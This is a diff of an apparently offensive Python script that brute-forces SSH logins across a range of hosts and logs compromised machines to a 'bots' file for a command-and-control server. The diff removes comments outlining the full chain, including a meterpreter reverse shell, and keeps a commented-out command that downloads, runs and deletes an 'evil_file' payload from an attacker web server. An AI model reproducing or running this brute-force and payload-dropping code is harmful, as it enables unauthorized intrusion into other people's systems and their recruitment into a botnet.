@@ -3,18 +3,6 @@ import multiprocessing
 import time
 import warnings
 
-# scan_drop.py functions
-# 1. scans target network for nodes running ssh services on port 22.
-# 2. if target found, dictionary attack.
-# 3. if successful, RCE.
-# 4. user@target# "wget" a file (evil_file) from our web server.
-# 4. user@target# run payload.
-# 5. user@target# delete payload & disconnect.
-
-# evil_file functions
-# 1. "evil_file" is a binary meterpreter tcp reverse shell to C&C.
-# 2. C&C takes over while scan_drop.py disconnects.
-
 # remove depracated warnings
 warnings.filterwarnings(action='ignore',module='.*paramiko.*')
 
@@ -33,7 +21,7 @@ def ssh_start():
     try:
         p.connect(ip, username=user_list[num], password=pass_list[num2])
 #        stdin, stdout, stderr = p.exec_command('wget "192.168.203.1/evil_file" -O /tmp ; chmod 755 /tmp/evil_file; /tmp/./evil_file; sleep 1; rm /tmp/evil_file')
-		# print then append target's output into file 'bots' on C&C.
+        # print then append target's output into file 'bots' on C&C.
         stdin, stdout, stderr = p.exec_command('uname -a; id')
         f = open("bots", "a")
         f.write("=" * 70 + "\n")
@@ -47,6 +35,7 @@ def ssh_start():
         f.close()
     except paramiko.AuthenticationException:
             pass
+
 
 for i in range(150,155):
     for num in range(0,4):
